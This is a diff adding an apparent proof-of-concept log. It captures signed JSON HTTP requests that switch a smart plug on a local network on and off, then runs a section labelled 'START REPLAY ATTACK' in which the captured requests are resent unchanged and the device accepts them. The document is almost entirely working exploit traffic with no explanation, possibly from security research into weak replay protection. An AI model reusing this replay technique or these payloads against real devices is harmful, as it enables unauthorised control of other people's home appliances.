@@ -1,0 +1,64 @@
+[nltk_data] Downloading package punkt to /root/nltk_data...
+[nltk_data]   Package punkt is already up-to-date!
+POST /config HTTP/1.1
+Connection: close
+Content-Type: application/json; charset=UTF-8
+Content-Length: 349
+Host: 10.42.0.126
+Accept-Encoding: gzip
+User-Agent: okhttp/3.12.0
+
+{"header":{"from":"http://10.42.0.126/config","messageId":"15dcf8afa0e7a5003da52b1af13bf86b","method":"SET","namespace":"Appliance.Control.ToggleX","payloadVersion":1,"sign":"7402081206af395312179a173355bc11","timestamp":1705062048,"triggerSrc":"AndroidLocal","uuid":"21012131127760290d3548e1e947c6ee"},"payload":{"togglex":{"channel":0,"onoff":0}}}
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"header":{"messageId":"15dcf8afa0e7a5003da52b1af13bf86b","namespace":"Appliance.Control.ToggleX","method":"SETACK","payloadVersion":1,"from":"/appliance/21012131127760290d3548e1e947c6ee/publish","timestamp":1705062048,"timestampMs":549,"sign":"7402081206af395312179a173355bc11"},"payload":{}}
+
+POST /config HTTP/1.1
+Connection: close
+Content-Type: application/json; charset=UTF-8
+Content-Length: 349
+Host: 10.42.0.126
+Accept-Encoding: gzip
+User-Agent: okhttp/3.12.0
+
+{"header":{"from":"http://10.42.0.126/config","messageId":"dc761d1127dfc89287e0d0c8e5f52ead","method":"SET","namespace":"Appliance.Control.ToggleX","payloadVersion":1,"sign":"e175763186346cbb02087ab568337e1a","timestamp":1705062050,"triggerSrc":"AndroidLocal","uuid":"21012131127760290d3548e1e947c6ee"},"payload":{"togglex":{"channel":0,"onoff":1}}}
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"header":{"messageId":"dc761d1127dfc89287e0d0c8e5f52ead","namespace":"Appliance.Control.ToggleX","method":"SETACK","payloadVersion":1,"from":"/appliance/21012131127760290d3548e1e947c6ee/publish","timestamp":1705062050,"timestampMs":713,"sign":"e175763186346cbb02087ab568337e1a"},"payload":{}}
+
+START REPLAY ATTACK
+#######################################################################################
+sent payload=POST /config HTTP/1.1
+Connection: close
+Content-Type: application/json; charset=UTF-8
+Content-Length: 349
+Host: 10.42.0.126
+Accept-Encoding: gzip
+User-Agent: okhttp/3.12.0
+
+{"header":{"from":"http://10.42.0.126/config","messageId":"dc761d1127dfc89287e0d0c8e5f52ead","method":"SET","namespace":"Appliance.Control.ToggleX","payloadVersion":1,"sign":"e175763186346cbb02087ab568337e1a","timestamp":1705062050,"triggerSrc":"AndroidLocal","uuid":"21012131127760290d3548e1e947c6ee"},"payload":{"togglex":{"channel":0,"onoff":1}}}
+****************************************************************
+received payload=HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"header":{"messageId":"dc761d1127dfc89287e0d0c8e5f52ead","namespace":"Appliance.Control.ToggleX","method":"SETACK","payloadVersion":1,"from":"/appliance/21012131127760290d3548e1e947c6ee/publish","timestamp":1705062071,"timestampMs":140,"sign":"f4733094d974bbba14624eb221c28b80"},"payload":{}}
+
+****************************************************************
+sent payload=POST /config HTTP/1.1
+Connection: close
+Content-Type: application/json; charset=UTF-8
+Content-Length: 349
+Host: 10.42.0.126
+Accept-Encoding: gzip
+User-Agent: okhttp/3.12.0
+
+{"header":{"from":"http://10.42.0.126/config","messageId":"15dcf8afa0e7a5003da52b1af13bf86b","method":"SET","namespace":"Appliance.Control.ToggleX","payloadVersion":1,"sign":"7402081206af395312179a173355bc11","timestamp":1705062048,"triggerSrc":"AndroidLocal","uuid":"21012131127760290d3548e1e947c6ee"},"payload":{"togglex":{"channel":0,"onoff":0}}}
+****************************************************************
+received payload=HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"header":{"messageId":"15dcf8afa0e7a5003da52b1af13bf86b","namespace":"Appliance.Control.ToggleX","method":"SETACK","payloadVersion":1,"from":"/appliance/21012131127760290d3548e1e947c6ee/publish","timestamp":1705062071,"timestampMs":153,"sign":"b024e977f2c2450a2547ce46a9d98d65"},"payload":{}}
+
+****************************************************************
